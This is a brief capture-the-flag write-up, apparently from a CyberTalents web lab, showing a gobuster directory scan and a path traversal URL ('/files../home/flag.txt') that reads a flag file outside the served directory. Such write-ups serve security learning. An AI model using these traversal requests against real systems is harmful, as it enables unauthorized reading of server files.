I started by enumerating directories using `gobuster`:

```bash id="m4q8vx"
gobuster dir -u http://cdcamxwl32pue3e6mr4gvmkxal3dm0wz0wkr5cwzo-web.cybertalentslabs.com/ \
-w /usr/share/wordlists/dirb/common.txt
```

This revealed the `/files` directory.

While browsing the files, I discovered that the application was vulnerable to Path Traversal.
By using directory traversal sequences, I accessed the flag file outside the intended directory:

```txt id="r7q2va"
http://cdcamxwl32pue3e6mr4gvmkxal3dm0wz0wkr5cwzo-web.cybertalentslabs.com/files../home/flag.txt
```

